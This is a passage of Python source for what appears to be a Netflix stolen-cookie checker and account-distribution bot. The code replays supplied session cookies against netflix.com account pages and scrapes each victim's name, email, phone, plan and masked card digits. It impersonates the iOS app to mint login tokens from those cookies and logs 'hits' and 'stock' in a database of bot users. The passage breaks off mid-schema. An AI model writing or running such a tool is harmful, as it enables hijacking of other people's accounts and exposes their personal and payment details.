        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone
    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")
    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break
    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)
    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())
    def _first_boolean_label(*candidates):
        for candidate in candidates:
            labeled = format_boolean_label(candidate)
            if labeled is not None:
                return labeled
        return None
    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None
    hold_status = _first_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta,
        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None,
        hold_meta.get("isOnHold") if isinstance(hold_meta, dict) else None,
        hold_meta.get("pastDue") if isinstance(hold_meta, dict) else None,
        growth_account.get("isUserOnHold"),
        growth_account.get("holdStatus"),
        growth_account.get("isOnHold"),
        growth_account.get("pastDue"),
        growth_account.get("isPastDue"),
    )
    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
        "maxStreams": current_plan.get("maxStreams"),
    }
    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            if re.fullmatch(r"\d{4}", payment_display_text):
                info["maskedCard"] = payment_display_text
            else:
                info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text
    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"
    return {key: value for key, value in info.items() if value not in (None, "", [], {})}

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    parsed = format_boolean_label(value)
    if parsed is not None:
        return parsed
    return value

def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    if not names:
        return None
    return ", ".join(names)

def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged

def has_complete_account_info(info):
    if not info:
        return False
    required_fields = (
        "countryOfSignup",
        "membershipStatus",
        "localizedPlanName",
        "maxStreams",
        "videoQuality",
    )
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)

def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extra_member_account_patterns = (
        r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
        r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
        r"extra\s+on\s+someone.?else.?s\s+plan",
        r"abbonato\s+extra\s+sul\s+piano\s+di\s+un.?altra\s+persona",
        r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait\s+de\s+quelqu.?un\s+d.?autre",
        r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
    )
    extra_member_by_response_text = any(
        re.search(pattern, response_text, re.IGNORECASE)
        for pattern in extra_member_account_patterns
    )
    if has_complete_account_info(graphql_info):
        extracted = dict(graphql_info)
    else:
        extracted = {
            "accountOwnerName": extract_first_match(response_text, [
                    r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                    r'"accountOwnerName"\s*:\s*"([^"]+)"',
                    r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"firstName"\s*:\s*"([^"]+)"',
                ]),
	            "email": extract_first_match(response_text, [
                    r'"emailAddress"\s*:\s*"([^"]+)"',
                    r'"email"\s*:\s*"([^"]+)"',
                    r'"loginId"\s*:\s*"([^"]+)"',
                ]),
	            "countryOfSignup": extract_first_match(response_text, [
                    r'"currentCountry"\s*:\s*"([^"]+)"',
                    r'"countryOfSignup":\s*"([^"]+)"',
                ]),
            "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
	            "nextBillingDate": extract_first_match(response_text, [
                    r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                    r'"nextBillingDate"\s*:\s*"([^"]+)"',
                    r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                ]),
            "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
            "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
            "maxStreams": extract_first_match(response_text, [
                r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
                r'"maxStreams"\s*:\s*"?([^",}]+)"?',
            ]),
	            "localizedPlanName": extract_first_match(response_text, [
                    r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                    r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"localizedPlanName"\s*:\s*"([^"]+)"',
                    r'"planName"\s*:\s*"([^"]+)"',
                ]),
	            "planPrice": extract_first_match(response_text, [
                    r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                    r'"formattedPrice"\s*:\s*"([^"]+)"',
                    r'"planPriceDisplay"\s*:\s*"([^"]+)"',
                    r'"displayPrice"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*"([^"]+)"',
                ]),
	            "paymentMethodType": extract_first_match(response_text, [
                    r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"paymentMethod"\s*:\s*"([^"]+)"',
                    r'"paymentType"\s*:\s*"([^"]+)"',
                    r'"paymentMethodType"\s*:\s*"([^"]+)"',
                ]),
	            "maskedCard": extract_first_match(response_text, [
                    r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
                    r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                    r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                    r'"lastFour"\s*:\s*"([^"]+)"',
                    r'"maskedCard"\s*:\s*"([^"]+)"',
                ]),
            "phoneNumber": extract_first_match(response_text, [
                r'"phoneNumber"\s*:\s*"([^"]+)"',
                r'"mobilePhone"\s*:\s*"([^"]+)"',
            ]),
            "videoQuality": extract_first_match(response_text, [
                r'"videoQuality"\s*:\s*"([^"]+)"',
                r'"quality"\s*:\s*"([^"]+)"',
            ]),
            "holdStatus": extract_bool_value(response_text, [
                r'"holdStatus"\s*:\s*(true|false)',
                r'"isUserOnHold"\s*:\s*(true|false)',
            ]),
            "emailVerified": extract_bool_value(response_text, [
                r'"emailVerified"\s*:\s*(true|false)',
                r'"isEmailVerified"\s*:\s*(true|false)',
            ]),
            "profiles": extract_profile_names(response_text),
        }
        extracted = merge_info(graphql_info, extracted)
    extracted.setdefault("paymentMethodType", None)
    extracted.setdefault("maskedCard", None)
    extracted.setdefault("holdStatus", None)
    extracted.setdefault("emailVerified", None)
    extracted.setdefault("phoneNumber", None)
    if extra_member_by_response_text:
        extracted["isExtraMemberAccount"] = "Yes"
    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = None
    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"
    if extracted["holdStatus"] is None:
        membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
        if membership_status_key == "current_member":
            extracted["holdStatus"] = "No"
        elif any(token in membership_status_key for token in ("hold", "past_due", "payment_retry", "paused", "suspend")):
            extracted["holdStatus"] = "Yes"
    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"
    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))
    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None
    return extracted

# ============================================================
# PLAN DETECTION
# ============================================================

def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    normalized = normalize_plan_key(raw_plan) if raw_plan else ""
    plan_aliases = {
        "premium": {
            "premium", "高級", "高级", "cao_cap", "ozel", "المميزة", 
            "พรีเมียม", "프리미엄", "プレミアム", "premium_plan",
            "premium_extra_member", "extra_member_premium", "caocap",
            "ultra", "4k", "uhd", "Премиум"
        },
        "standard_with_ads": {
            "standard_with_ads", "standardwithads", "estandar_con_anuncios",
            "padrao_com_anuncios", "광고형_스탠다드", "standard with ads",
            "standar con anuncios", "standard con pubblicità",
            "Paket Standar dengan iklan", "Padrão com anúncios",
            "広告つきスタンダード", "标准广告版"
        },
        "standard": {
            "standard", "estandar", "标准", "標準", "standardowy", 
            "padrao", "standart", "スタンダード", "standardni", "standaard",
            "hd", "full hd", "1080p", "Standard", "Smart"
        },
        "basic": {
            "basic", "basico", "dasar", "基本", "베이직", "ベーシック", 
            "temel", "พื้นฐาน", "podstawowy", "osnovni", "alap",
            "sd", "480p", "Básico", "الأساسية", "Mobile", "Dasar"
        },
        "mobile": {
            "mobile", "ponsel", "seluler", "movil", "มือถือ", "모바일", "モバイル"
        },
        "family": {"family", "familia", "famille", "familie", "familj"},
        "student": {"student", "estudiante", "etudiant", "studenten", "studente"}
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)
    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"
    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    return is_extra_member_account(info)

# ============================================================
# NETFLIX SERVICE (FULLY FIXED)
# ============================================================

class NetflixService:
    NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    @staticmethod
    def extract_cookie_bundles(content: str) -> List[Dict]:
        return extract_netflix_cookie_bundles(content)
    
    @staticmethod
    def get_cookie_text(cookies_dict: Dict) -> str:
        lines = []
        for name, value in cookies_dict.items():
            if not value:
                continue
            secure = "TRUE" if name == "SecureNetflixId" else "FALSE"
            lines.append(f".netflix.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
        return "\n".join(lines)
    
    @staticmethod
    def parse_account_page(response_text: str) -> Dict:
        return extract_info(response_text)
    
    @staticmethod
    def is_subscribed(info: Dict) -> bool:
        return is_subscribed_account(info)
    
    @staticmethod
    def is_on_hold(info: Dict) -> bool:
        return is_on_hold_account(info)
    
    @staticmethod
    def derive_plan(info: Dict, is_subscribed: bool) -> Tuple[str, str]:
        return derive_plan_info(info, is_subscribed)
    
    @staticmethod
    def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
        if not netflix_id or len(netflix_id) < 20:
            return None, None
        
        query_params = {
            "appVersion": "15.48.1",
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
            "device_type": "NFAPPL-02-",
            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "idiom": "phone",
            "iosVersion": "15.8.5",
            "isTablet": "false",
            "languages": "en-US",
            "locale": "en-US",
            "maxDeviceWidth": "375",
            "model": "saget",
            "modelType": "IPHONE8-1",
            "odpAware": "true",
            "path": '["account","token","default"]',
            "pathFormat": "graph",
            "pixelDensity": "2.0",
            "progressive": "false",
            "responseFormat": "json",
        }
        
        headers = {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            "x-netflix.request.attempt": "1",
            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
            "x-netflix.context.app-version": "15.48.1",
            "x-netflix.argo.translated": "true",
            "x-netflix.context.form-factor": "phone",
            "x-netflix.context.sdk-version": "2012.4",
            "x-netflix.client.appversion": "15.48.1",
            "x-netflix.context.max-device-width": "375",
            "x-netflix.context.ab-tests": "",
            "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
            "x-netflix.client.type": "argo",
            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "x-netflix.context.locales": "en-US",
            "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.client.iosversion": "15.8.5",
            "accept-language": "en-US;q=1",
            "x-netflix.argo.abtests": "",
            "x-netflix.context.os-version": "15.8.5",
            "x-netflix.request.client.context": '{"appState":"foreground"}',
            "x-netflix.context.ui-flavor": "argo",
            "x-netflix.argo.nfnsm": "9",
            "x-netflix.context.pixel-density": "2.0",
            "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        }
        
        for attempt in range(max(1, attempts)):
            try:
                headers_copy = dict(headers)
                headers_copy["Cookie"] = f"NetflixId={netflix_id}"
                headers_copy["x-netflix.request.attempt"] = str(attempt + 1)
                
                response = requests.get(
                    NetflixService.NFTOKEN_API_URL,
                    params=query_params,
                    headers=headers_copy,
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    data = response.json()
                    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                    token = token_data.get("token")
                    expires = token_data.get("expires")
                    if token:
                        expiry_str = None
                        if expires:
                            try:
                                ts = int(expires)
                                if len(str(ts)) == 13:
                                    ts //= 1000
                                expiry_str = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                            except:
                                expiry_str = expires
                        return token, expiry_str
                time.sleep(0.5)
            except:
                time.sleep(0.5)
        
        return None, None
    
    @staticmethod
    def check_account(cookies_dict: Dict) -> Dict:
        """Enhanced account checker - 3 URLs, proper cleaning."""
        if not cookies_dict:
            return {"valid": False, "error": "No cookies"}
        
        netflix_id = decode_netflix_value(cookies_dict.get("NetflixId", ""))
        
        if not netflix_id or len(netflix_id) < 30:
            for key, value in cookies_dict.items():
                if isinstance(value, str) and len(value) > 50:
                    cleaned_value = decode_netflix_value(value)
                    if cleaned_value and len(cleaned_value) > 30:
                        netflix_id = cleaned_value
                        logger.info(f"Using fallback token from {key}")
                        break
        
        if not netflix_id or len(netflix_id) < 30:
            return {"valid": False, "error": "No usable token found"}
        
        session = None
        try:
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
            })
            
            for name, value in cookies_dict.items():
                cleaned_value = decode_netflix_value(value)
                if not cleaned_value:
                    continue
                try:
                    if name == "NetflixId":
                        session.cookies.set(name, netflix_id, domain=".netflix.com", path="/")
                    elif name == "SecureNetflixId":
                        session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/", secure=True)
                    else:
                        session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/")
                except Exception:
                    pass
            
            # ============================================================
            # 3 URLs for account checking (CLI Level)
            # ============================================================
            urls = [
                "https://www.netflix.com/account/membership",
                "https://www.netflix.com/YourAccount",
                "https://www.netflix.com/browse"
            ]
            
            last_error = None
            retry_count = max(1, MAX_RETRIES)
            
            for attempt in range(retry_count):
                for url in urls:
                    try:
                        response = session.get(
                            url,
                            headers={"Accept-Encoding": "identity"},
                            timeout=CHECK_TIMEOUT,
                            verify=False,
                            allow_redirects=True
                        )
                        
                        if "login" in response.url.lower() or "signin" in response.url.lower():
                            return {"valid": False, "error": "Redirected to login - cookie expired or invalid"}
                        
                        if response.status_code == 200:
                            text = response.text
                            info = NetflixService.parse_account_page(text)
                            
                            # Fallback if info is incomplete
                            if not has_complete_account_info(info) and url != "https://www.netflix.com/YourAccount":
                                try:
                                    fallback_resp = session.get(
                                        "https://www.netflix.com/YourAccount",
                                        headers={"Accept-Encoding": "identity"},
                                        timeout=CHECK_TIMEOUT,
                                        verify=False
                                    )
                                    if fallback_resp.status_code == 200:
                                        fallback_info = NetflixService.parse_account_page(fallback_resp.text)
                                        info = merge_info(info, fallback_info)
                                except:
                                    pass
                            
                            is_subscribed = NetflixService.is_subscribed(info)
                            
                            # If we have at least country or plan, consider it valid
                            if info.get("countryOfSignup") or info.get("localizedPlanName"):
                                nftoken = None
                                nftoken_expiry = None
                                if netflix_id:
                                    nftoken, nftoken_expiry = NetflixService.generate_nftoken(netflix_id)
                                
                                plan_key, plan_label = NetflixService.derive_plan(info, is_subscribed)
                                on_hold = NetflixService.is_on_hold(info)
                                
                                return {
                                    "valid": True,
                                    "subscribed": is_subscribed,
                                    "on_hold": on_hold,
                                    "info": info,
                                    "plan_key": plan_key,
                                    "plan_label": plan_label,
                                    "nftoken": nftoken,
                                    "nftoken_expiry": nftoken_expiry,
                                }
                        elif response.status_code == 403:
                            last_error = "HTTP 403 Forbidden"
                            continue
                        elif response.status_code == 429:
                            time.sleep(2)
                            continue
                            
                    except requests.exceptions.Timeout:
                        last_error = "Timeout"
                        continue
                    except requests.exceptions.ConnectionError:
                        last_error = "Connection Error"
                        continue
                    except Exception as e:
                        last_error = str(e)
                        continue
                
                if attempt < retry_count - 1:
                    time.sleep(1)
            
            return {"valid": False, "error": last_error or "Could not validate account"}
            
        except Exception as e:
            logger.error(f"check_account error: {e}")
            return {"valid": False, "error": str(e)}
        finally:
            if session:
                try:
                    session.close()
                except:
                    pass

# ============================================================
# TURSO CURSOR WRAPPER
# ============================================================

class TursoCursorWrapper:
    def __init__(self, result_set):
        if hasattr(result_set, 'columns'):
            self._columns = getattr(result_set, 'columns', ())
            self._rows = getattr(result_set, 'rows', [])
        else:
            self._columns = ()
            self._rows = []
        self._index = 0
        self.rowcount = getattr(result_set, 'rows_affected', len(self._rows))
        self.lastrowid = getattr(result_set, 'last_insert_rowid', None)

    @property
    def description(self):
        return tuple((col, None, None, None, None, None, None) for col in self._columns)

    def fetchone(self):
        if self._index < len(self._rows):
            row = self._rows[self._index]
            self._index += 1
            if hasattr(row, 'astuple'):
                return row.astuple()
            elif isinstance(row, (tuple, list)):
                return tuple(row)
            return (row,)
        return None

    def fetchall(self):
        remaining = self._rows[self._index:]
        self._index = len(self._rows)
        res = []
        for r in remaining:
            if hasattr(r, 'astuple'):
                res.append(r.astuple())
            elif isinstance(r, (tuple, list)):
                res.append(tuple(r))
            else:
                res.append((r,))
        return res

    def __iter__(self):
        return self

    def __next__(self):
        r = self.fetchone()
        if r is None:
            raise StopIteration
        return r

# ============================================================
# DATABASE MANAGER
# ============================================================

class DatabaseManager:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.turso_conn = None
        self.sqlite_conn = None
        self.use_turso = False
        self.turso_driver_type = None
        self._turso_lock = threading.Lock()
        self._sqlite_lock = threading.Lock()
        self._connect_turso()
        self._connect_sqlite()
    
    def _connect_turso(self):
        raw_url = TURSO_DATABASE_URL.strip() if TURSO_DATABASE_URL else ""
        token = TURSO_AUTH_TOKEN.strip() if TURSO_AUTH_TOKEN else ""
        
        if not raw_url:
            logger.info("ℹ️ TURSO_DATABASE_URL not configured — using local SQLite.")
            self.use_turso = False
            return

        clean_host = raw_url
        for prefix in ["libsql://", "https://", "http://", "wss://", "ws://"]:
            if clean_host.startswith(prefix):
                clean_host = clean_host[len(prefix):]
                break

        candidate_urls = [f"https://{clean_host}", f"libsql://{clean_host}"]

        try:
            import libsql_client
            for target_url in candidate_urls:
                try:
                    logger.info(f"🔄 Attempting Turso connection to {target_url}...")
                    client = libsql_client.create_client_sync(url=target_url, auth_token=token if token else None)
                    client.execute("SELECT 1")
                    self.turso_conn = client
                    self.turso_driver_type = 'client_sync'
                    self.use_turso = True
                    logger.info(f"✅ Turso connected via libsql_client ({target_url})")
                    self._init_turso_tables()
                    return
                except Exception:
                    pass
        except Exception:
            pass

        try:
            import libsql
            for target_url in candidate_urls:
                try:
                    try:
                        conn = libsql.connect(target_url, auth_token=token if token else None)
                    except TypeError:
                        conn = libsql.connect(target_url)
                    cur = conn.cursor()
                    cur.execute("SELECT 1")
                    cur.fetchone()
                    self.turso_conn = conn
                    self.turso_driver_type = 'cursor'
                    self.use_turso = True
                    logger.info(f"✅ Turso connected via libsql.connect ({target_url})")
                    self._init_turso_tables()
                    return
                except Exception:
                    pass
        except Exception:
            pass

        logger.error("❌ Could not connect to Turso — falling back to local SQLite.")
        self.use_turso = False
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def _connect_sqlite(self):
        try:
            os.makedirs(DATA_DIR, exist_ok=True)
            self.sqlite_conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False, timeout=30)
            self.sqlite_conn.execute('PRAGMA journal_mode=WAL')
            self.sqlite_conn.execute('PRAGMA synchronous=NORMAL')
            self.sqlite_conn.execute('PRAGMA cache_size=10000')
            self.sqlite_conn.execute('PRAGMA temp_store=MEMORY')
            logger.info("✅ SQLite connected")
            self._init_sqlite_tables()
        except Exception as e:
            logger.error(f"❌ SQLite error: {e}")
            raise
    
    def _init_turso_tables(self):
        if not self.turso_conn:
            return
        statements = [
            '''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_banned BOOLEAN DEFAULT 0,
                is_admin BOOLEAN DEFAULT 0,
                last_account_time TIMESTAMP,
                total_working INT DEFAULT 0,
                total_notworking INT DEFAULT 0,
                working_reports INT DEFAULT 0,
                notworking_reports INT DEFAULT 0,
                accounts_used INT DEFAULT 0,
                pending_report BOOLEAN DEFAULT 0,
                pending_report_account_id INTEGER,
                pending_report_type TEXT,
                warnings INT DEFAULT 0
            )''',
            '''CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                account_id INTEGER,
                report_type TEXT,
                screenshot_file_id TEXT,
                status TEXT DEFAULT 'pending',
                reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reviewed_at TIMESTAMP,
                admin_note TEXT,
                admin_id INTEGER,
                channel_post_id INTEGER
            )''',
            '''CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                message TEXT,
                admin_reply TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                replied_at TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE,
                channel_name TEXT,
                invite_link TEXT,
                is_active BOOLEAN DEFAULT 1
            )''',
            '''CREATE TABLE IF NOT EXISTS stock_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                file_name TEXT,
                total_found INT,
                valid_found INT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE UNIQUE,
                total_hits INT DEFAULT 0,
                total_free INT DEFAULT 0,
                total_bad INT DEFAULT 0
            )''',
            '''CREATE TABLE IF NOT EXISTS ban_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                admin_id INTEGER,
                reason TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS warning_logs (
